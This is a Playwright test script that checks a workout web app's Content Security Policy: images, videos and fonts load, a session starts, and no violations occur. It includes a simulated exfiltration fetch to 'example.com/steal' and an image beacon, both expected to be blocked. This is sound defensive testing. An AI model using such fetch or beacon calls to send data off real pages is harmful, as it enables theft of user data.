// The real page (no test hook, so its own CSP applies): media and fonts load, nothing can be sent to another site.
// The real page (no test hook) under its CSP: no violations, fonts/images/videos load, a workout runs, and a blocked exfiltration attempt is blocked.
const { chromium } = require('playwright');
const P = require('./paths.cjs');
(async () => {
  const b = await chromium.launch(); const out = [];
  for (const url of [P.APP]) {
    const p = await b.newPage({ viewport: { width: 390, height: 800 } }); const v = []; const errs = [];
    p.on('console', m => { if (/Content Security Policy|Refused to/.test(m.text())) v.push(m.text().slice(0, 160)); else if (m.type() === 'error') errs.push(m.text().slice(0, 120)); });
    p.on('pageerror', e => errs.push(e.message));
    await p.goto(url); await p.evaluate(() => localStorage.clear()); await p.reload(); await p.waitForTimeout(800);
    await p.click('[data-act="ob-skip"]'); await p.waitForTimeout(800);
    const imgs = await p.$$eval('.wcard img', e => e.filter(i => i.complete && i.naturalWidth > 0).length);
    await p.click('[data-act="ready-sheet"]', { force: true }); await p.waitForTimeout(300); await p.click('[data-act="start-sess"]', { force: true }); await p.waitForTimeout(800);
    const vid = await p.$$eval('video', e => e.map(x => x.readyState));
    const fonts = await p.evaluate(() => [...document.fonts].filter(f => f.status === 'loaded').map(f => f.family).slice(0, 4));
    const ex = await p.evaluate(async () => { try { await fetch('https://example.com/steal?x=1'); return 'fetch allowed'; } catch (e) { return 'fetch blocked'; } });
    const im = await p.evaluate(() => new Promise(r => { const i = new Image(); i.onload = () => r('img allowed'); i.onerror = () => r('img blocked'); i.src = 'https://example.com/p.png'; }));
    const pass = (c, m) => out.push((c ? 'PASS ' : 'FAIL ') + m);
    pass(imgs > 10, 'workout cover images load under the CSP (' + imgs + ')'); pass(vid.length && vid.every(r => r >= 1), 'technique clips load'); pass(fonts.length > 0, 'web fonts load');
    pass(ex === 'fetch blocked', 'fetch to another site is blocked'); pass(im === 'img blocked', 'image beacon to another site is blocked');
    pass(!v.filter(x => !/example\.com/.test(x)).length, 'the app itself causes no CSP violations ' + v.filter(x => !/example\.com/.test(x)).join(' | '));
    pass(!errs.filter(x => !/example\.com/.test(x)).length, 'no page errors ' + errs.join(' | '));
  }
  console.log(out.join('\n')); await b.close();
})();
